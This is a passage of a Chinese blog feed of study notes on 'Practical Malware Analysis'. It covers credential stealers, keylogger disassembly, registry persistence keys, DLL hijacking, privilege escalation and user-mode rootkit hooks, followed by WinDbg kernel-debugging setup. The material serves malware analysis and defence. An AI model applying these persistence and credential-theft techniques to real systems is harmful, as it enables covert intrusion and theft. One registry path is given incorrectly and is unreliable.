）是一个免费提供且流行的远程控制工具。它的功能由shellcode插件控制，这使得它具有良好的扩展性。Poison Ivy是一款有用的工具，它能够快速生成用来测试和分析的恶意样本。</p></blockquote><h3 id="3-僵尸网络"><a href="#3-僵尸网络" class="headerlink" title="3. 僵尸网络"></a>3. 僵尸网络</h3><p>僵尸网络是被感染主机（也称为僵尸主机）的一个集合。它们由单一实体控制，通常由一个称为僵尸控制器的机器作为服务器。僵尸网络的目标是尽可能多地感染机器，来构建一个更大的僵尸主机网络，从而使僵尸网络传播其他的恶意代码或蠕虫，或者执行分布式拒绝服务（DDoS）攻击。</p><p>在实施分布式拒绝服务攻击时，所有僵尸主机会在同一时刻访问同一个站点，僵尸网络能够让这个站点挂掉。</p><h3 id="4-远程控制工具与僵尸网络的比较"><a href="#4-远程控制工具与僵尸网络的比较" class="headerlink" title="4. 远程控制工具与僵尸网络的比较"></a>4. 远程控制工具与僵尸网络的比较</h3><p>在远程控制工具与僵尸网络之间有一些不同</p><ol><li>僵尸网络感染和控制数以百万计的主机。远程控制工具通常只控制很少数量的主机。</li><li>僵尸网络中的所有主机在同一时刻被控制，而远程控制工具是以每个受害者为单位进行远程控制，因为远程控制工具要求攻击者与受害主机之间更紧密地交互。</li><li>远程控制工具被用来执行针对性的攻击，而僵尸网络用来进行大规模攻击。</li></ol><h2 id="11x3-登录凭证窃密器"><a href="#11x3-登录凭证窃密器" class="headerlink" title="11x3 登录凭证窃密器"></a>11x3 登录凭证窃密器</h2><p>攻击者经常会不遗余力地去窃取登录凭证，他们主要使用以下三种类型的恶意代码</p><ol><li>等待用户登录以窃取登录凭证的程序。</li><li>转储Windows系统中存放信息的程序，例如密码哈希值，程序直接使用它，或者对它进行离线破解。</li><li>击键记录程序。</li></ol><h3 id="1-GINA拦截"><a href="#1-GINA拦截" class="headerlink" title="1. GINA拦截"></a>1. GINA拦截</h3><p>在WindowsXP系统中，恶意代码使用微软图形识别和验证界面（GINA）拦截技术来窃取用户的登录凭证。GINA的设计目的是让合法第三方通过添加一些代码，来自定义登录过程，如用硬件无线射频标识（RFID）令牌或者智能卡来进行身份认证等。恶意代码编写者利用GINA对第三方的支持来加载窃密器。</p><p>GINA在msgna.dll中实现，这个DLL在用户登录系统过程中由Winlogon可执行文件加载。Winlogon也为第三方定制实现DLL程序工作，在Winlogon与GINADLL之间加载第三方DLL（类似于中间人攻击）。为了方便，Windows用下列注册表项，来存储需要Winlogon加载的第三方DLL。<br><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\winlogon\GinaDLL</code></p><h3 id="2-口令哈希转储"><a href="#2-口令哈希转储" class="headerlink" title="2. 口令哈希转储"></a>2. 口令哈希转储</h3><p>转储Windows口令哈希是恶意代码获取系统登录凭证的一种流行方法。攻击者试图抓取这些口令哈希，以便离线暴力破解，或者利用它们执行Pass-the-Hash攻击。Pass-the-Hash攻击在无须破解或解密口令哈希以获取明文密码的情况下，使用LM或者NTLM哈希来通过远程主机的身份验证，从而获得访问权。</p><p>Pwdump和Pas-the-Hash（PSH）工具包是提供口令哈希转储免费可用的软件包。因为这两种工具都开源，很多恶意代码都派生于它们的源码。因为多数反病毒软件都拥有它们标准版本的特征码，所以通常情况下，攻击者要逃避探测就会编译他们的专有版本。</p><p>pwdump是一个程序集合，它从安全账户管理器（SAM）输出本地用户账户的LM和NTLM口令哈希。pwdump通过注入DLL到本地安全认证子系统服务（LSASS）进程进行攻击。我们将在第12章深入讨论DLL注入技术。现在，我们仅需要了解DLL注入是恶意代码在另外一个进程中运行DLL的一种方法，因此它提供了DLL与被注入进程相同的权限。口令哈希转储工具通常针对lsass.exe进程，因为它拥有足够的权限来访问很多有用的API函数。</p><p>标准pwdump程序使用的DLL是lsaext.dll，一旦DLL在lsass.exe中运行，pwdump就会调用GetHash，这个函数由lsaext.dll导出，目的是执行口令哈希提取。提取函数会使用未文档化的Windows函数，来枚举系统中的用户，并且获得每个用户未解密的口令哈希。</p><p>处理pwdump程序变种时，你需要分析DLL，以便确定它如何执行口令哈希转储操作。首先查看DLL的导出函数，pwdump默认的导出函数是GetHash，但是攻击者可以很容易地修改这个导出函数的名字，使它不那么显而易见。接下来，尝试确定导出函数使用的API函数。因为多数API函数需要动态解析，所以口令哈希转储导出函数通常会多次调用GetProcAddress。</p><h3 id="3-击键记录"><a href="#3-击键记录" class="headerlink" title="3. 击键记录"></a>3. 击键记录</h3><p>击键记录是一种传统形式的窃取登录凭证方法。当击键记录开启时，恶意代码能够记录用户击键操作，从而让攻击者能够观察到用户敲入的数据，如用户名、密码。Windows平台上的恶意代码使用多种形式的击键记录。</p><blockquote><p>基于内核的击键记录器</p></blockquote><p>用户模式下的应用程序很难探测到基于内核的击键记录器。它们经常作为Rootkit的一部分并且它们作为一个键盘驱动绕过用户空间应用程序和保护，来捕获击键操作。</p><blockquote><p>用户空间的击键记录器</p></blockquote><p>Windows用户空间的击键记录器通常使用WindowsAPI并且常通过挂钩（hook）或者轮询来实现。</p><p>挂钩在键盘每次按下时用Windows API通知恶意代码，通常使用SetwindowsHookEx安装挂钩。轮询使用Windows API不断地轮询按键的状态，它通常使用函数GetAsyncKeyState和GetForegroundWindow。</p><p>挂钩击键记录器使用的WindowsAPl函数是SetwindowsHookEx。这种类型的恶意代码可能被打包成一个初始化挂钩函数的可执行文件，它也可能包含一个处理击键记录的DLL文件，这个DLL文件被自动地映射到系统的多个进程中。</p><p>GetAsynckeyState函数用来识别一个按键是被按下还是被弹起，是否是在最近一次GetAsyncKeyState函数被调用后按下。GetForegroundWindow函数识别当前聚焦的前端窗口，它告诉击键记录器当前哪个应用程序正在执行输入（例如Notepad、Internet Explorer）。</p><blockquote><p>轮询击键记录器中的典型循环结构<br><img src="https://i.loli.net/2018/07/23/5b554852b3083.jpg" alt="i"></p><p>GetAsynckeyState和GetForegroundWindow 击键记录器的反汇编<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00401162 call ds:GetForegroundWindow</span><br><span class="line">···</span><br><span class="line">00401272 push 10h ；nVirtKey Shift</span><br><span class="line">00401274 call ds:GetKeyState</span><br><span class="line">0040127A mov esi，dword_403308[ebx]</span><br><span class="line">00401280 push esi；vKey</span><br><span class="line">00401281 movsx edi，ax</span><br><span class="line">00401284 call ds:CetAsyncKeyState</span><br><span class="line">0040128A test ah，80h</span><br><span class="line">0040128D jz short 1oc_40130A</span><br><span class="line">0040128F push 14h；nvirtkey Caps Lock</span><br><span class="line">00401291 call ds:GetKeyState</span><br><span class="line">···</span><br><span class="line">004013EF add ebx，4</span><br><span class="line">004013F2 cmp ebx，368</span><br><span class="line">004013F8 j1 loc_401272</span><br></pre></td></tr></table></figure></p></blockquote><p>在进入内部循环之前程序调用了GetForegroundwindow函数。内部循环开始后，立即使用GetKeyState检查Shift键的状态，函数GetKeyState是快速检查按键状态的方法，与GetAsyncKeyState一样，它不能记住在它被调用后，按键是否被按下。接下来，击键记录器用EBX来索引键盘上的按键数组。如果一个新的按键被按下，击键记录器在调用GetkeyState查看CapsLock是否被激活之后，记录击键。最后，递增EBX确保代码清单中的下一个按键被检查。一旦检查了92个（368/4）按键，内部循环就结束了，再次调用GetForegroundwindow进入新的内部循环。</p><blockquote><p>通过字符串列表识别击键记录器</p></blockquote><p>可以通过查看恶意代码的导入API来识别击键记录器的功能。也可以通过检查标志字符串列表来识别击键记录器的功能，对于使用导入函数混淆技术或者使用你未见过的击键记录器功能的恶意代码来说，这种技术特别有用。</p><h2 id="11x4-存活机制"><a href="#11x4-存活机制" class="headerlink" title="11x4 存活机制"></a>11x4 存活机制</h2><p>一旦恶意代码获取系统的控制权，它通常就会在系统中驻留很长一段时间，恶意代码的这种行为被称为存活。如果存活机制足够特别，它甚至能作为给定恶意代码的指纹。</p><h3 id="1-Windows注册表"><a href="#1-Windows注册表" class="headerlink" title="1. Windows注册表"></a>1. Windows注册表</h3><p>一些工具可以帮助你搜索恶意代码在注册表中的存活位置，例如Sysintermals的自动化程序，它可以帮你找出系统中所有的自动启动程序。像ProcMon这样的工具可以帮助你在执行基本的动态分析时，监控系统中的所有注册表修改。</p><blockquote><p>AppInit_DLL</p></blockquote><p>恶意代码编写者可以通过一个名为AppInit DLL特殊注册表项来让他们的DLL获得加载。AppInit_DLL中的DLL程序会在进程加载User32.dl时被加载。插入DLL路径到注册表Applnit_DLL，会让DLL程序获得加载机会。</p><p>AppInit_DLL的值存储在如下Windows注册表键中<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost</code><br>Applnit_DLL值的类型是REG_SZ，它由空格分隔的字符串组成。很多进程都会加载User32.dll，这些进程也会加载Applnit DLL。恶意代码编写者通常只针对一个单独进程，但是AppInit DLL会被加载到多个进程中。因此，恶意代码编写者执行攻击负载（playload）前必须检查它运行在哪个进程中。这种检查通常在恶意DLL程序的DLLMain函数中完成。</p><blockquote><p>Winlogon Notify</p></blockquote><p>恶意代码编写者可以挂钩一个特殊的Winlogon事件，如登录、注销、关机以及锁屏，等等。这甚至可以允许恶意代码在安全模式下加载。下面注册表键中的注册表项包含Notify的值。<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\MicroSoft\Windows NT\CurrentVersion\Winlogon\</code><br>当winlogon.exe产生一个事件时，Windows系统会检查Notify注册表键来查找处理这个事件的DLL程序。</p><blockquote><p>SvcHost DLL</p></blockquote><p>所有服务都存在于注册表中，如果一个服务的注册表键被移除，则这个服务将不能启动。恶意代码经常作为一个服务安装，但是更多的时候作为一个可执行文件使用。安装的恶意代码作为swchost.exe的DLL来存活，这使得恶意代码可以与其他进程混淆，且更像标准的服务。</p><p>svchost.exe是从动态链接库中运行服务的通用主机进程，Windows操作系统通常同一时刻运行多个svchost.exe实例。每个实例包含一组服务，这些服务能够使开发、测试以及服务组管理变得更简单。</p><p>这些组被定义在下列的注册表位置（每个值代表一个不同的组）<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\MicroSoft\Windows NT\CurrentVersion\Svchost</code></p><p>服务被定义在下列的注册表位置<br><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\ServiceName</code></p><p>Windows服务包含多个注册表值，其中多数提供关于服务的信息。例如DisplayName和Description。恶意代码编写者通常会设置有助于恶意代码混淆的值，例如NetWareMan，它提供访问文件和打印NetWare网络资源的服务。另外一个注册表值为ImagePath，它包含服务可执行文件的位置。以svuchost.exe DLL为例，这个注册表值包含<code>%SystemRoot%/System32/svchost.exe -k GroupName</code>。</p><p>所有的svchost.exe DLL包含拥有ServiceDLL值的Parameters键，这是恶意代码编写者设置恶意DLL程序的位置，Parameters键下另一个值start用来确定服务何时启动（恶意代码通常设置为系统引导时启动）。</p><p>Windows拥有很多预先定义的服务组，所以恶意代码通常不会创建一个新的服务组，因为新创建的服务组很容易被探测。相反，多数恶意代码会将其加入一个已经存在的组或者覆盖一个无关紧要的服务——经常使用netsvcs服务组中很少使用的服务。要识别这种技术，使用动态分析监视Windows的注册表，或者在反汇编中查找CreateServiceA函数。如果恶意代码修改这些注册表键，你就会知道它们使用了这种存活技术。</p><h3 id="2-特洛伊木马化（Trojanized）系统二进制文件"><a href="#2-特洛伊木马化（Trojanized）系统二进制文件" class="headerlink" title="2. 特洛伊木马化（Trojanized）系统二进制文件"></a>2. 特洛伊木马化（Trojanized）系统二进制文件</h3><p>利用这种技术，恶意代码能够修改系统的二进制文件，当被感染的二进制文件下次运行或者加载时，将会强制运行恶意代码。恶意代码编写者主要针对Windows系统正常操作时最常使用的二进制文件，而DLL是恶意代码编写者欢迎的目标。</p><p>恶意代码通常修改一个系统文件的函数入口点，使它跳转到恶意代码。这些修改补丁覆盖函数的开始代码或者覆盖其他一些并不影响特洛伊木马化DLL正常操作的代码。为了不影响二进制文件的正常操作，恶意的代码被加入到可执行文件的一个空节中。插入的代码通常用来加载恶意代码，插入的函数并不关心它被插入到被感染的DLL的何处。加载恶意代码后，为了让DLL的操作与插入前的代码一致，代码会跳转回原始的DLL程序。</p><p>检查一个受感染的系统时，我们会注意到系统的二进制文件rutils.dll没有预想的MD5哈希值，所以我们进一步调查。我们将可疑版本的rtutils.dll与干净版本的rutils.dll一同加载到IDAPro。比较它们的D11EntryPoint函数。不同之处十分明显：特洛伊木马化版本的rtutits.dl会跳转到其他位置。<br><img src="https://i.loli.net/2018/07/23/5b557303ce5cd.jpg" alt="i"></p><h3 id="3-DLL加载顺序劫持"><a href="#3-DLL加载顺序劫持" class="headerlink" title="3. DLL加载顺序劫持"></a>3. DLL加载顺序劫持</h3><p>DLL加载顺序劫持是一种简单隐蔽的技术，它允许恶意代码编写者在不使用注册表项或者特洛伊二进制文件的前提下创建一个存活的、恶意的DLL程序。这种技术甚至不需要单独的恶意加载器，因为它有能力让Windows加载它。</p><blockquote><p>在WindowsXP上加载DLL的默认搜索顺序</p><ol><li>加载应用程序的目录。</li><li>当前目录。</li><li>系统目录（使用GetsystemDirectory函数获取的路径，例如…/Windows/System32）。</li><li>16位子系统的系统目录（例如.…/Windows/System）。</li><li>Windows目录（使用GetwindowsDirectory获取的路径，例如.…/Windows）。</li><li>PATH环境变量里列出的目录。</li></ol></blockquote><p>在WindowsXP系统中，利用KnownDLL注册表键可以跳过DLL的加载过程，这个注册表键保护一些特定的DLL位置列表，这些DLL通常位于…/Windows/System32/目录下。设计KnownDLL机制的目的是改善安全（恶意的DLL不能放到加载顺序的前面）和速度（Windows不需要默认搜索前面的列表），但是它仅包含一个较短的重要DLL列表。</p><p>DLL加载顺序劫持可以被/System32之外目录中的二进制文件利用，来加载/System32目录中未被KnownDLL保护的DLL程序。例如，/Windows目录下explorer.exe会加载/System32目录下的ntshrui.dll。由于ntshrui.dll并不是一个KnownDLL，所以遵循默认搜索顺序，另外，/Windows目录在/System32目录之前被搜索。如果恶意的DLL被命名为ntshrui.dll并放到/Windows目录，则它将被加载到合法DLL的位置。为了让系统正常运行，恶意DLL程序随后再加载真正的DLL。</p><p>/System32目录之外的二进制文件都容易受到这种攻击，其中explorer.exe约有50个易受攻击的DLL。此外，由于DLL递归导入的原因，很多DLL会加载其他的DLL，而这些DLL按照默认顺序加载，因此KnownDLL机制也不能得到充分的保护。</p><h2 id="11x5-提权"><a href="#11x5-提权" class="headerlink" title="11x5 提权"></a>11x5 提权</h2><p>多数提权攻击是利用本地系统已知漏洞或者0day漏洞进行攻击，其中多数可以在Metasploit Framework中找到（<a href="http://www.metasploit.com/" target="_blank" rel="noopener">http://www.metasploit.com/</a> ）。甚至，DLL加载顺序劫持也可以被用来执行特权操作。如果恶意DLL所在的目录是用户可写的，并且加载这个DLL的进程在一个高特权级上运行，那么恶意DLL就获得了提权。拥有提权操作的恶意代码比较罕见，但是分析人员应该能识别常见的提权方法。</p><p>有时，甚至当用户以本地管理员运行时，恶意代码还会要求提权。运行在Windows系统中的进程或者运行在用户级别，或者运行在系统级别。通常用户不能操纵系统级别的进程，即使他们是管理员。</p><h3 id="1-使用SeDebugPrivilege"><a href="#1-使用SeDebugPrivilege" class="headerlink" title="1. 使用SeDebugPrivilege"></a>1. 使用SeDebugPrivilege</h3><p>以用户权限运行的进程并没有任意访问系统一切资源的权限，也不能拥有这种权限。例如在远程进程中调用类似于TerminateProcess和CreateRemoteThread函数。恶意代码获得访问这些函数的权限的唯一方法是通过设置访问令牌的权限来开启SeDebugPrivilege.在Windows系统中，访问令牌（access token）是一个包含进程安全描述符的对象。安全描述符用来指定拥有者的访问权限。</p><p>SeDebugPrivilege特权作为一个系统级别调试的工具被创建，但是恶意代码编写者用它来获取系统进程拥有的所有权限。默认情况下，SeDebugPrivilege只赋给本地管理员账户，基本可以认为赋予用户SeDebugPrivilege权限就等于给予他们本地系统账户权限。普通的用户账号不能给自身赋予SeDebugPrivilege权限，它的这种请求会被拒绝。</p><h2 id="11x6-隐藏它的踪迹——用户态的Rootkit"><a href="#11x6-隐藏它的踪迹——用户态的Rootkit" class="headerlink" title="11x6 隐藏它的踪迹——用户态的Rootkit"></a>11x6 隐藏它的踪迹——用户态的Rootkit</h2><p>恶意代码经常不遗余力地对用户隐藏它的生存机制和正在运行的进程。常用来隐藏恶意代码行为的工具被称为Rootkit。</p><p>Rootkit有多种存在形式，但是大部分Rootkt通过修改操作系统内部的功能来工作。这种修改可以使恶意代码的文件、进程、网络连接以及其他资源对其他程序隐藏，这也使得反病毒产品、管理员以及安全分析人员难以发现它们的恶意活动。</p><p>一些Rootkt会修改用户态的应用程序，但大部分会修改内核，因为保护机制（例如入侵防护系统）都运行在内核层。当它们运行在内核层而不是用户层时，Rootkit和入侵防御机制都很有效。在内核层，Rootkit比在用户层更容易破坏操作系统。</p><p>处理用户态安装挂钩Rootkit的一种较好策略是：先确定挂钩的位置，然后找出挂钩都干了什么。</p><h3 id="1-IAT-Hook"><a href="#1-IAT-Hook" class="headerlink" title="1. IAT Hook"></a>1. IAT Hook</h3><p>IAT Hook是用户空间中一种经典的Rootkit方法，它隐藏本地系统中的文件、进程以及网络连接。这种挂钩方法修改导入地址表（IAT）或者导出地址表（EAT）。</p><p>IAT Hook是一种过时且容易探测的挂钩方式，因此现代的Rootkit都使用更高级的inline Hook方法代替。</p><h3 id="2-Inline-Hook"><a href="#2-Inline-Hook" class="headerlink" title="2. Inline Hook"></a>2. Inline Hook</h3><p>Inline Hook是通过覆盖导入DLL中APl函数的代码来实现的，所以它必须等到DLL被加载后才能执行。IAT Hook只简单地修改函数指针，但Inline Hook将修改实际的函数代码。</p><p>恶意Rootkit通常用一个跳转指令替换函数的开始代码来执行Inline Hook，这个跳转指令使Rootkit插入的恶意代码获取执行。另外，Rootkit还可以通过改变函数的代码来破坏它或者改变它，而不是跳转到恶意代码。</p><p>From <a href="https://kabeor.github.io/第11章  恶意代码行为/">https://kabeor.github.io/第11章  恶意代码行为/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第11章-恶意代码行为&quot;&gt;&lt;a href=&quot;#第11章-恶意代码行为&quot; class=&quot;headerlink&quot; title=&quot;第11章  恶意代码行为&quot;&gt;&lt;/a&gt;第11章  恶意代码行为&lt;/h1&gt;&lt;h2 id=&quot;11x1-下载器和启动器&quot;&gt;&lt;a href=&quot;#11x
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第10章  使用WinDbg调试内核</title>
    <link href="https://kabeor.github.io/%E7%AC%AC10%E7%AB%A0%20%20%E4%BD%BF%E7%94%A8WinDbg%E8%B0%83%E8%AF%95%E5%86%85%E6%A0%B8/"/>
    <id>https://kabeor.github.io/第10章  使用WinDbg调试内核/</id>
    <published>2018-07-22T12:50:32.076Z</published>
    <updated>2018-07-22T12:51:08.168Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第10章-使用WinDbg调试内核"><a href="#第10章-使用WinDbg调试内核" class="headerlink" title="第10章  使用WinDbg调试内核"></a>第10章  使用WinDbg调试内核</h1><p>本章将探索使用WinDbg进行内核调试和Rootkit分析的方法。</p><h2 id="10x1-驱动与内核代码"><a href="#10x1-驱动与内核代码" class="headerlink" title="10x1 驱动与内核代码"></a>10x1 驱动与内核代码</h2><p>Windows设备驱动简称为驱动，它让第三方开发商在Windows内核模式下运行代码。</p><p>由于驱动程序常驻内存，并且负责响应用户态应用程序的请求，因此分析它十分困难。另外，由于应用程序不直接与驱动程序通信，而是直接访问设备对象，向具体的物理设备发送请求，使得<br>驱动程序更加难以分析。设备对象由驱动程序创建和销毁，可以被用户态的程序直接访问，但它们并非一定是真实的物理设备。</p><p>为了系统能够正常工作，驱动程序必须加载到内核空间，这与DLL需加载到进程空间是同样的道理。当驱动首次被加载时，DriverEntry函数将被调用，这与DLLMain相似。</p><p>与DLL通过函数导出表提供其功能接口不同，驱动通过注册回调函数来提供功能。当用户态的应用程序请求一个服务时，这些回调函数将会被调用。回调函数在DriverEntry程序中被注册。</p><p>Windows会为每个驱动创建一个驱动对象，并以参数形式将其传给DriverEntry函数，DriverEntry函数用回调函数填充这个驱动对象。然后DriverEntry会创建一个可以被用户态应用程序访问的设<br>备对象，应用程序与驱动的交互请求都将通过这个设备对象进行。</p><p>考虑来自用户态应用程序的一个读数据请求。最终这个请求被发送到负责管理硬件并存储读入数据的驱动程序。首先，用户态应用程序应该获得该硬件设备的一个文件句柄，然后在该句柄上调<br>用函数ReadFile。接着内核将会处理ReadFile函数的请求，最终由驱动程序的回调函数来响应对I/O设备的读请求。</p><p>请求内核态恶意组件的最常见函数是DeviceIoControl，它是从用户态模块到内核设备的一种通用请求方法。使用该函数时，用户态应用程序传递一个任意长度的缓冲区数据作为输入，并且接<br>收一个任意长度的缓冲区数据作为输出。</p><p>用户态应用程序到内核态驱动的调用由操作系统完成，这种调用难以被跟踪．如图展示了请求从用户态程序发起并最终到达一个内核驱动的过程。从图中可以看出，请求由用户态程序发起，最后到达内核驱动。在发送到内核的请求中，一部分请求发送到设备驱动去控制硬件设备，而另外一部分仅仅影响一些内核的内部状态。<br><img src="https://i.loli.net/2018/07/22/5b545fac1cab8.jpg" alt="im"></p><p>恶意驱动通常不控制硬件设备，而是与Windows操作系统主要的内核组件ntoskrnl. exe、hal.dll进行交互。ntoskrnl.exe组件包含操作系统核心功能的代码，hal.dll包含与主要硬件设备交互的代码。恶意代码常通过从一个或者多个这样的内核组件中导入函数，来操纵内核。</p><h2 id="10x2-安装内核调试"><a href="#10x2-安装内核调试" class="headerlink" title="10x2 安装内核调试"></a>10x2 安装内核调试</h2><p>内核调试比起用户模式调试来说更加复杂，因为进行内核调试时，操作系统将被冻结，这种情况下不可能运行调试器。因此，调试内核的常用方法是使用VMware。</p><p>与用户态调试不同，内核调试需要一些初始化设置。首先需要设置虚拟操作系统并开启内核调试，然后配置VMware使虚拟机与宿主系统之间有一条虚拟化的串口，同时还应该配置宿主操作系统中的WinDbg。</p><p>虚拟操作系统的设置是编辑C:\boot.ini(Windows XP下请确保文件夹选项设置为显示隐藏文件)。该文件在系统中通常是隐藏的。建议在编辑boot.ini文件之前，为你的虚拟操作系统做一个快照，如果配置文件错误或者损坏了boot.ini，你可以使用快照还原系统。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[boot loader]</span><br><span class="line">timeout=30</span><br><span class="line">default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS</span><br><span class="line">[operating systems]</span><br><span class="line">multi(0)disk(0)rdisk(0)partition(1)WINDOWS=&quot;Microsoft Windows XP Professional&quot;   编号1</span><br><span class="line">/noexecute=optin /fastdetect</span><br><span class="line">multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;Microsoft Windows XP Professional with Kernel Debugging&quot;   编号2</span><br><span class="line">/noexecute=optin /fastdetect /debug /debugport=COM1/baudrate=115200</span><br></pre></td></tr></table></figure><p>以Windows XP为例，代码中编号1处指明默认加载的操作系统。编号2处是为了设置内核调试而加入的一行。通常你系统中的boot.ini与编号1类似．</p><p>复制系统中boot.ini最后一行，然后粘贴到boot. ini中新的一行，除了你应该加入的附加选项<code>/debug /debugport=COMl /baudrate=115200</code>外．其他项均与上一行相同(不用考虑行上其他的元素，如<code>multi(0)disk(0)</code>，简单的完全复制，只需加入附加选项）。其中<code>/debug</code>标记代表开启内核调试，<code>/debugport=COM1</code>标记告诉系统使用哪个端口来连接调试系统与被调试系统，<code>/baudrate=115200</code>标记用来指定串口数据传输速率。在本例中，我们使用VMware创建的串口。为了方便识别开机系统选项，我们将第二启动项命为“Microsoft Windows XP Professional with Kernel Debugging”。</p><p>当下次开机运行你的虚拟操作系统时，系统会提供一个开启内核调试的选项’止你选择。另外，系统会给你30秒的时间，决定是否以调试模式启动系统。如果想要连接内核调试器（即WinDbg），你需要在每次开机时选择调试版本启动项。</p><p>下一步，需要设置VMware，在虚拟操作系统和宿主操作系统之间创建一个虚拟连接。为此，我们在VMware上添加一个新的设备来使用宿主系统中的一个命名管道上的串口。下面是添加设备的步骤：</p><p><strong>1. 单击VM-&gt;Settings．然后会弹出VMware设置对话框。</strong><br><strong>2. 在VMware设置对话框中，单击右下角的Add按钮，在弹出的设备类型选择窗口中选择Serial Port，然后单击下一步。</strong><br><strong>3. 在请求串口类型的对话框中，选择Output to Named Pipe，然后单击下一步。</strong><br><strong>4. 在接下来的窗口中，输入\.\pipe\com_1对管道进行命名，然后选择This end is the server和The other end is an application。</strong><br><strong>5. 选中Yield CPU on poll单选框。</strong></p><p><img src="https://i.loli.net/2018/07/22/5b5468e9c465b.jpg" alt="enter description here"></p><p>完成虚拟机的配置后启动虚拟机。在宿主操作系统中，使用下列步骤使WinDbg连接虚拟机并开始调试内核。<br><strong>1．启动WinDbg。</strong><br><strong>2．选择File—Kemel Debug．单击COM标签，然后输入文件名和先前在boot.ini文件中设置的波特率</strong></p><p>如果虚拟操作系统处于运行状态，调试器会在数秒内连接到虚拟机操作系统。如果虚拟操作系统没有运行，调试器将处于等待，直到虚拟操作系统启动，启动过程中调试器将连接到被调试系统。调试器连接后，为了更加全面地获取到调试过程发生的事件，建议在调试过程中启用详细信息输出功能。启用详细信息输出功能后，每当驱动程序被加载和卸载时，你将会得到通知。这些信息在某些情况下可以帮助你识别恶意驱动的加载。</p><h2 id="10x3-使用WinDbg"><a href="#10x3-使用WinDbg" class="headerlink" title="10x3 使用WinDbg"></a>10x3 使用WinDbg</h2><h3 id="1-从内存中读取"><a href="#1-从内存中读取" class="headerlink" title="1. 从内存中读取"></a>1. 从内存中读取</h3><p>WinDbg的内存窗口支持直接通过命令来浏览内存。命令d是用来读取如程序数据或堆栈等内存位置的命令。</p><blockquote><p>基本语法</p></blockquote><p><code>dx addressToRead</code><br>这里x是显示数据格式的一个选项。<br><img src="https://i.loli.net/2018/07/22/5b546adbe93c1.jpg" alt="几种显示数据常用的方式"></p><p>e命令使用方法相同，来改变内存的值<br><code>ex addressToWrite dataToWrite</code><br>其中x与dx命令中的x值相同</p><h3 id="2-使用算术操作符"><a href="#2-使用算术操作符" class="headerlink" title="2. 使用算术操作符"></a>2. 使用算术操作符</h3><p>WinDbg支持在命令行中使用简单的算术操作符，对内存和寄存器进行直接操作，如加(+)、减（-）、乘(* )、除(/)。在试图创建一个条件表达式断点时，命令行选项就如快捷方式一样好用。</p><p>命令dwo用来解引用一个32位的指针，并查看该指针代表地址的值。</p><h3 id="3-设置断点"><a href="#3-设置断点" class="headerlink" title="3. 设置断点"></a>3. 设置断点</h3><p>在WinDbg调试器中，bp命令用来设置基本断点。同时WinDbg也可以使用一些命令，这些命令可以在断点触发时、控制转给用户之前自动运行。使用go(g)命令在断点处执行一个动作后继续执行，而不用等待用户。</p><h3 id="4-列举模块"><a href="#4-列举模块" class="headerlink" title="4. 列举模块"></a>4. 列举模块</h3><p>在OllyDbg调试中，内存映射可以列举出所有内存段与加载模块，但是WinDbg却没有相似的功能。然而,WinDbg的lm命令可以列举出加载到进程空间的所有模块，包括用户模式下的可执行模块,DLL以及内核模式下的内核驱动，同时也会列举出每个模块的起始与结束地址。</p><h2 id="10x4-微软符号表"><a href="#10x4-微软符号表" class="headerlink" title="10x4 微软符号表"></a>10x4 微软符号表</h2><p>调试符号表提供了有限的源代码信息，来帮助理解汇编代码。微软提供的调试符号表中包含某些函数和变量的名字。</p><p>在这里所说的调试符号就是某个特定内存地址的一个名称，大多数调试符号提供一个地址名称来表示一个函数，也有一些地址名称表示数据地址。</p><h3 id="1-搜索符号"><a href="#1-搜索符号" class="headerlink" title="1. 搜索符号"></a>1. 搜索符号</h3><p>WinDbg中符号的格式如下所示<br><code>moduleName!symbolName</code></p><p>这种语法可以在任意一个拥有正常地址的地方使用。其中moduleName表示.exe、.dll或者.sys格式文件的文件名（不包括其扩展名）。symbolName是与这个地址相关联一个名字。然向，ntoskrnl.exe是一个特例，它的module Name是nt，而不是ntoskrnl。</p><p>bu命令允许你用符号在没有加载的代码中设置一个延迟断点。延迟断点是一个断点，仅当加载一个名字匹配的模块时，延迟断点才会被设置。</p><p>x命令允许你使用通配符来搜索函数或符号。</p><p>Ln用来列出最接近给定内存地址的符号，它可以用来确认指针指向的函数。</p><h3 id="2-查看结构信息"><a href="#2-查看结构信息" class="headerlink" title="2. 查看结构信息"></a>2. 查看结构信息</h3><p>微软符号也包含多个数据结构的类型信息，包括没有被公开的内部类型。对于恶意代码分析人员，这些信息非常有用，因为恶意代码经常操作未公开的数据结构。</p><h3 id="3-配置Windows符号表"><a href="#3-配置Windows符号表" class="headerlink" title="3. 配置Windows符号表"></a>3. 配置Windows符号表</h3><p>符号表依赖于被分析文件的具体版本，它们随着文件的更新或修复而改变。如果配置正确。WinDbg将查询微软的服务器，自动获得正在调试文件的正确符号表。你可以通过选择File-&gt;Symbol File Path，来设置符号文件路径。为了配置WinDbg，让其使用在线符号服务器，输入以F路径：<br><code>SRV*c:\websymbols*http://msdl.microsoft.com/download/symbols</code><br>SRV配置了一个服务器，路径C:\websymbols是符号信息的本地缓存，网址则是微软符号服务器的<br>固定位置。</p><p>如果要调试的机器并不能一直连接互联网，你可以根据你使用操作系统、服务包、机器的体系结构等信息，手动从微软服务器下载指定的符号包。符号文件通常有几百兆大小，因为它们包含操作系统和服务包的所有修改和补丁版本的符号信息。</p><h2 